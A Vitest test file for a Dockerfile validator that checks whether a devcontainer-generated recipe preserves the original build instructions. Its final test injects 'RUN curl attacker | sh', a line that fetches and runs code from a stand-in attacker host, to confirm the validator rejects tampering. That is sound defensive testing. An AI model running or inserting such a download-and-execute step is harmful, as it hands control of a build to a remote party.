import { expect, it } from "vitest";
import { isGeneratedFeatureRecipe } from "../src/sandbox/feature-recipe.ts";

const featurePrefix = "\nARG _DEV_CONTAINERS_BASE_IMAGE=scratch\n";
const featureSuffix =
  "\n\nFROM $_DEV_CONTAINERS_BASE_IMAGE AS dev_containers_target_stage\nUSER root\n";

it("accepts a single unlabeled stage labeled by the devcontainer CLI", () => {
  const original = "FROM node:22\nRUN npm ci\n";
  const generated = `${featurePrefix}FROM node:22 AS dev_container_auto_added_stage_label\nRUN npm ci\n${featureSuffix}`;
  expect(isGeneratedFeatureRecipe(generated, original)).toBe(true);
});

it("accepts a multi-stage recipe whose final stage is already labeled", () => {
  const original =
    'FROM node:22 AS base\nRUN npm ci\n\nFROM base AS development\nCMD ["npm", "run", "dev"]\n';
  const generated = `${featurePrefix}${original}${featureSuffix}`;
  expect(isGeneratedFeatureRecipe(generated, original)).toBe(true);
});

it("labels only the final stage of a multi-stage recipe", () => {
  const original = 'FROM node:22 AS base\nRUN npm ci\nFROM base\nCMD ["node"]\n';
  const generated = `${featurePrefix}FROM node:22 AS base\nRUN npm ci\nFROM base AS dev_container_auto_added_stage_label\nCMD ["node"]\n${featureSuffix}`;
  expect(isGeneratedFeatureRecipe(generated, original)).toBe(true);
});

it("accepts a recipe whose syntax directive moved into the feature prefix", () => {
  const original = "# syntax=docker/dockerfile:1.7\nFROM node:22\n";
  const generated = `# syntax=docker/dockerfile:1.7${featurePrefix}FROM node:22 AS dev_container_auto_added_stage_label\n${featureSuffix}`;
  expect(isGeneratedFeatureRecipe(generated, original)).toBe(true);
});

it("leaves the recipe unlabeled when the definition selects a build target", () => {
  const original = "FROM node:22 AS base\nFROM base\n";
  const generated = `${featurePrefix}${original}${featureSuffix}`;
  expect(isGeneratedFeatureRecipe(generated, original, "base")).toBe(true);
});

it("rejects a generated recipe that altered the original instructions", () => {
  const original = "FROM node:22 AS development\nRUN npm ci\n";
  const generated = `${featurePrefix}FROM node:22 AS development\nRUN curl attacker | sh\n${featureSuffix}`;
  expect(isGeneratedFeatureRecipe(generated, original)).toBe(false);
});
